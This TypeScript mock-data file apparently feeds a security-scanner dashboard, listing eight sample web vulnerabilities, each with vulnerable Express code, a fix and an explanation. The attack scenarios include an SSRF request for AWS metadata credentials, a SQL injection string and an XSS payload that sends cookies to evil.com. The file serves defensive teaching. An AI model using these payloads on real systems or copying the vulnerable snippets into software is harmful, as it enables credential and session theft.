import type { Finding } from './types';

export const mockFindings: Finding[] = [
  {
    id: 'SG-SSRF-001',
    title: 'Server-Side Request Forgery (SSRF)',
    type: 'SSRF',
    severity: 'critical',
    file: 'src/routes/preview.js',
    line: 18,
    risk: 'Attacker-controlled URL is passed directly to fetch() without validation.',
    impact: 'Internal services and cloud metadata endpoints (AWS IMDSv1, GCP, Azure) may be accessed, leading to credential theft or lateral movement.',
    status: 'open',
    cwe: 'CWE-918',
    cvss: 9.8,
    description: 'The application accepts a URL from the request body and passes it directly to a server-side HTTP fetch without validating the destination host. This allows an attacker to make the server send requests to arbitrary destinations.',
    attackScenario: 'An attacker sends a POST request to /api/preview with body {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"} and receives AWS IAM credentials in the response, enabling full account takeover.',
    aiExplanation: {
      whatIsWrong: 'The application accepts a URL directly from the user and sends it to fetch() without validating the destination host, protocol, or IP range.',
      whyItMatters: 'An attacker could use this endpoint to access internal services (databases, admin panels) or cloud metadata endpoints that are not intended to be publicly accessible, potentially leading to credential theft and complete infrastructure compromise.',
      whatToDo: 'Validate the URL hostname against an explicit allow-list of permitted domains. Block private, loopback, and link-local IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16). Use a URL parser to prevent bypass techniques.',
    },
    vulnerableCode: `app.post('/api/preview', async (req, res) => {
  // VULNERABLE: User-controlled URL passed directly to fetch
  const page = await fetch(req.body.url);
  res.send(await page.text());
});`,
    fixCode: `const ALLOWED_HOSTS = ['example.com', 'trusted-api.com'];

function validateAllowedHost(hostname: string) {
  if (!ALLOWED_HOSTS.includes(hostname)) {
    throw new Error('Host not allowed');
  }
  // Block private IP ranges
  const privateRanges = /^(10\\.|172\\.(1[6-9]|2\\d|3[01])\\.|192\\.168\\.|127\\.|169\\.254\\.)/;
  if (privateRanges.test(hostname)) {
    throw new Error('Private IP ranges are not allowed');
  }
}

app.post('/api/preview', async (req, res) => {
  const url = new URL(req.body.url);
  validateAllowedHost(url.hostname);
  const page = await fetch(url.toString());
  res.send(await page.text());
});`,
    vulnerableCodeHighlightLine: 2,
    tags: ['injection', 'network', 'server-side'],
  },
  {
    id: 'SG-MASS-002',
    title: 'Mass Assignment Vulnerability',
    type: 'Mass Assignment',
    severity: 'critical',
    file: 'src/routes/users.js',
    line: 41,
    risk: 'Request body is spread directly into database update without field filtering.',
    impact: 'Attackers can escalate privileges by sending {"role": "admin", "isVerified": true} in the request body, bypassing authorization controls.',
    status: 'open',
    cwe: 'CWE-915',
    cvss: 9.1,
    description: 'The user update endpoint spreads the entire request body into the database update operation without filtering out sensitive fields like role, isAdmin, or isVerified.',
    attackScenario: 'An attacker sends PUT /api/users/123 with body {"name": "John", "role": "admin", "isVerified": true} and successfully elevates their privileges to administrator.',
    aiExplanation: {
      whatIsWrong: 'The endpoint uses object spread (...req.body) to update user records without filtering which fields are allowed to be updated by a regular user.',
      whyItMatters: 'Any user can modify fields like role, isAdmin, permissions, or isVerified simply by including them in the request body. This completely bypasses your authorization model.',
      whatToDo: 'Use an explicit allow-list of fields that users are permitted to update. Use a validation library like Zod or Joi to define update schemas. Never pass req.body directly to database operations.',
    },
    vulnerableCode: `app.put('/api/users/:id', authenticate, async (req, res) => {
  // VULNERABLE: req.body spread directly into update
  const user = await User.findByIdAndUpdate(
    req.params.id,
    { ...req.body },  // ← Any field can be overwritten
    { new: true }
  );
  res.json(user);
});`,
    fixCode: `const userUpdateSchema = z.object({
  name: z.string().min(1).max(100).optional(),
  email: z.string().email().optional(),
  bio: z.string().max(500).optional(),
});

app.put('/api/users/:id', authenticate, async (req, res) => {
  const allowedFields = userUpdateSchema.parse(req.body);
  const user = await User.findByIdAndUpdate(
    req.params.id,
    allowedFields,
    { new: true }
  );
  res.json(user);
});`,
    vulnerableCodeHighlightLine: 4,
    tags: ['authorization', 'input-validation', 'privilege-escalation'],
  },
  {
    id: 'SG-IDOR-003',
    title: 'Insecure Direct Object Reference (IDOR)',
    type: 'IDOR',
    severity: 'high',
    file: 'src/routes/invoices.js',
    line: 27,
    risk: 'Invoice ID is used without verifying ownership, allowing horizontal privilege escalation.',
    impact: 'Any authenticated user can view, modify, or delete invoices belonging to other users by guessing sequential IDs.',
    status: 'open',
    cwe: 'CWE-639',
    cvss: 8.1,
    description: 'The invoice endpoint retrieves a record by ID from the request parameter without checking if the authenticated user owns that resource.',
    attackScenario: 'A user with invoice ID 1001 changes the URL to /api/invoices/1002 and accesses another customer\'s invoice, including billing details and personal information.',
    aiExplanation: {
      whatIsWrong: 'The API retrieves invoices using only the ID from the URL without verifying that the requesting user owns that invoice.',
      whyItMatters: 'This exposes every user\'s data to every other authenticated user. Attackers can enumerate sequential IDs to harvest all customer data.',
      whatToDo: 'Always include the authenticated user\'s ID in database queries. Use non-sequential, unpredictable identifiers (UUIDs). Implement resource-level authorization checks.',
    },
    vulnerableCode: `app.get('/api/invoices/:id', authenticate, async (req, res) => {
  // VULNERABLE: No ownership check
  const invoice = await Invoice.findById(req.params.id);
  res.json(invoice);
});`,
    fixCode: `app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await Invoice.findOne({
    _id: req.params.id,
    userId: req.user.id, // ← Enforce ownership
  });
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  res.json(invoice);
});`,
    vulnerableCodeHighlightLine: 3,
    tags: ['authorization', 'access-control', 'idor'],
  },
  {
    id: 'SG-SQL-004',
    title: 'SQL Injection',
    type: 'SQL Injection',
    severity: 'high',
    file: 'src/routes/search.js',
    line: 12,
    risk: 'User input is concatenated into SQL query without parameterization.',
    impact: 'Complete database compromise, data exfiltration, data manipulation, or authentication bypass.',
    status: 'open',
    cwe: 'CWE-89',
    cvss: 9.0,
    description: 'User-supplied search query is directly concatenated into a SQL string, enabling injection attacks.',
    attackScenario: 'Attacker submits search query: \' OR 1=1 --  which returns all records from the database, bypassing intended filters.',
    aiExplanation: {
      whatIsWrong: 'User input is directly concatenated into SQL string without parameterization or escaping.',
      whyItMatters: 'SQL injection allows an attacker to read, modify, or delete all database content and potentially execute system commands.',
      whatToDo: 'Always use parameterized queries or prepared statements. Never concatenate user input into SQL strings. Use an ORM that handles parameterization automatically.',
    },
    vulnerableCode: `app.get('/api/search', async (req, res) => {
  // VULNERABLE: String concatenation in SQL
  const query = \`SELECT * FROM products WHERE name LIKE '%\${req.query.q}%'\`;
  const results = await db.query(query);
  res.json(results);
});`,
    fixCode: `app.get('/api/search', async (req, res) => {
  // SECURE: Parameterized query
  const results = await db.query(
    'SELECT * FROM products WHERE name LIKE ?',
    [\`%\${req.query.q}%\`]
  );
  res.json(results);
});`,
    vulnerableCodeHighlightLine: 3,
    tags: ['injection', 'database', 'sql'],
  },
  {
    id: 'SG-XSS-005',
    title: 'Cross-Site Scripting (Reflected XSS)',
    type: 'XSS',
    severity: 'high',
    file: 'src/routes/search.js',
    line: 35,
    risk: 'User input is reflected in HTML response without encoding.',
    impact: 'Attackers can inject malicious scripts that execute in victims\' browsers, stealing session cookies or performing actions on their behalf.',
    status: 'open',
    cwe: 'CWE-79',
    cvss: 7.4,
    description: 'The search term from the query string is reflected in the HTML response without HTML encoding, enabling reflected XSS.',
    attackScenario: 'Attacker sends a crafted URL with <script>document.location=\'https://evil.com/?c=\'+document.cookie</script> as the search term. Victims clicking the link have their session cookies stolen.',
    aiExplanation: {
      whatIsWrong: 'User-supplied data is included in the HTML response without encoding special characters.',
      whyItMatters: 'XSS allows attackers to execute arbitrary JavaScript in the context of your application, potentially hijacking sessions or performing actions as the victim.',
      whatToDo: 'Encode all user-supplied data before including it in HTML output. Use a templating engine that auto-escapes output. Set Content-Security-Policy headers.',
    },
    vulnerableCode: `app.get('/search', (req, res) => {
  // VULNERABLE: Reflected XSS
  res.send(\`<h1>Results for: \${req.query.q}</h1>\`);
});`,
    fixCode: `import { escape } from 'html-escaper';

app.get('/search', (req, res) => {
  const safeQuery = escape(req.query.q ?? '');
  res.send(\`<h1>Results for: \${safeQuery}</h1>\`);
});`,
    vulnerableCodeHighlightLine: 3,
    tags: ['xss', 'injection', 'client-side'],
  },
  {
    id: 'SG-AUTH-006',
    title: 'Missing Rate Limiting on Auth Endpoint',
    type: 'Brute Force',
    severity: 'medium',
    file: 'src/routes/auth.js',
    line: 8,
    risk: 'Login endpoint has no rate limiting, allowing unlimited password attempts.',
    impact: 'Attacker can automate password guessing attacks against user accounts.',
    status: 'open',
    cwe: 'CWE-307',
    cvss: 6.5,
    description: 'The login endpoint does not implement rate limiting, account lockout, or CAPTCHA, enabling brute-force attacks.',
    attackScenario: 'Attacker uses automated tooling to try thousands of passwords per minute against user accounts, eventually compromising accounts with weak passwords.',
    aiExplanation: {
      whatIsWrong: 'The authentication endpoint accepts unlimited login attempts without any throttling or lockout mechanism.',
      whyItMatters: 'Without rate limiting, attackers can automate credential stuffing and brute-force attacks, compromising accounts with weak or reused passwords.',
      whatToDo: 'Implement rate limiting (e.g., 5 attempts per 15 minutes per IP). Add account lockout after repeated failures. Consider CAPTCHA for repeated failures. Use express-rate-limit or similar.',
    },
    vulnerableCode: `app.post('/api/auth/login', async (req, res) => {
  // VULNERABLE: No rate limiting
  const user = await User.findOne({ email: req.body.email });
  const valid = await bcrypt.compare(req.body.password, user.passwordHash);
  if (valid) res.json({ token: generateToken(user) });
  else res.status(401).json({ error: 'Invalid credentials' });
});`,
    fixCode: `import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,
  message: 'Too many login attempts, please try again later',
});

app.post('/api/auth/login', loginLimiter, async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  const valid = await bcrypt.compare(req.body.password, user.passwordHash);
  if (valid) res.json({ token: generateToken(user) });
  else res.status(401).json({ error: 'Invalid credentials' });
});`,
    vulnerableCodeHighlightLine: 2,
    tags: ['authentication', 'brute-force', 'rate-limiting'],
  },
  {
    id: 'SG-CORS-007',
    title: 'Permissive CORS Configuration',
    type: 'CORS Misconfiguration',
    severity: 'medium',
    file: 'src/middleware/cors.js',
    line: 5,
    risk: 'CORS policy allows all origins, enabling cross-origin data theft.',
    impact: 'Malicious websites can make authenticated requests to your API using victims\' credentials.',
    status: 'open',
    cwe: 'CWE-942',
    cvss: 5.4,
    description: 'The CORS policy is configured with a wildcard (*) for allowed origins, defeating same-origin protection.',
    attackScenario: 'A malicious website makes an XHR request to your API, and because CORS allows all origins with credentials, the user\'s session cookie is sent, allowing data theft.',
    aiExplanation: {
      whatIsWrong: 'The CORS configuration uses a wildcard (*) to allow requests from any origin.',
      whyItMatters: 'This allows any website to make cross-origin requests to your API using the visitor\'s credentials, enabling data theft and CSRF-like attacks.',
      whatToDo: 'Maintain an explicit list of allowed origins. Never combine credentials: true with origin: "*". Validate the Origin header against your allowed list.',
    },
    vulnerableCode: `app.use(cors({
  origin: '*',           // VULNERABLE: Wildcard
  credentials: true,     // Combined with credentials is dangerous
}));`,
    fixCode: `const ALLOWED_ORIGINS = [
  'https://app.example.com',
  'https://dashboard.example.com',
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
}));`,
    vulnerableCodeHighlightLine: 2,
    tags: ['cors', 'misconfiguration', 'access-control'],
  },
  {
    id: 'SG-HEADER-008',
    title: 'Missing Security Headers',
    type: 'Security Headers',
    severity: 'low',
    file: 'src/app.js',
    line: 3,
    risk: 'Application is missing critical security headers.',
    impact: 'Increased attack surface for XSS, clickjacking, and MIME sniffing attacks.',
    status: 'open',
    cwe: 'CWE-693',
    cvss: 3.7,
    description: 'The application does not set recommended security headers including Content-Security-Policy, X-Frame-Options, and X-Content-Type-Options.',
    attackScenario: 'Without X-Frame-Options or CSP frame-ancestors, attackers can embed your app in an iframe on a malicious site and trick users into clicking hidden buttons (clickjacking).',
    aiExplanation: {
      whatIsWrong: 'The application is not sending recommended HTTP security headers that defend against common web attacks.',
      whyItMatters: 'Missing security headers make your application vulnerable to XSS amplification, clickjacking, MIME sniffing, and protocol downgrade attacks.',
      whatToDo: 'Use the helmet.js middleware which sets all recommended security headers automatically. Customize the Content-Security-Policy for your specific use case.',
    },
    vulnerableCode: `const express = require('express');
const app = express();
// MISSING: Security headers middleware`,
    fixCode: `const express = require('express');
const helmet = require('helmet');
const app = express();

app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{random}'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
  },
}));`,
    vulnerableCodeHighlightLine: 3,
    tags: ['headers', 'misconfiguration', 'defense-in-depth'],
  },
];

export const getSeverityCounts = () => {
  return mockFindings.reduce(
    (acc, f) => {
      acc[f.severity] = (acc[f.severity] || 0) + 1;
      return acc;
    },
    { critical: 0, high: 0, medium: 0, low: 0 } as Record<string, number>
  );
};
